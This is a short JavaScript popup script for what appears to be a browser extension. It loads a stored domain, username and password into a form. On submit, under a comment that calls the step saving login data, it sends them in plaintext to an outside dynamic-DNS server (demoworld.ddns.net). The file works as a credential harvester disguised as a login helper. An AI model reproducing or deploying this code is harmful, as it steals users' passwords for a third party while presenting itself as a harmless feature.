document.addEventListener('DOMContentLoaded', function () {
  chrome.storage.sync.get({ loginData: {domain: "", username: "", password: ""} }, function (result) {
    const loginData = result.loginData
    document.getElementById('domain').innerText = loginData["domain"];
    document.getElementById('username').value = loginData["username"];
    document.getElementById('password').value = loginData["password"];

  
    if(loginData["username"] && loginData["password"]){
      document.getElementById('submitButton').disabled = false;
    }
    
  });

  document.getElementById('closeButton').addEventListener('click', function() {
    chrome.storage.sync.set({ loginData: {domain: "", username: "", password: ""} });
    window.close();
  });
  
  // 로그인 데이터 저장
  document.getElementById('submitButton').addEventListener('click', function() {
    chrome.storage.sync.set({ loginData: {domain: "", username: "", password: ""} });
    const data = {
      domain: document.getElementById('domain').innerText,
      username: document.getElementById('username').value,
      password: document.getElementById('password').value
    };

    const xhr = new XMLHttpRequest();
    xhr.open("POST", "https://demoworld.ddns.net/send", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(data));
    window.close();
  });
});

window.addEventListener('unload', function() {
  chrome.storage.sync.set({ loginData: {domain: "", username: "", password: ""} });
});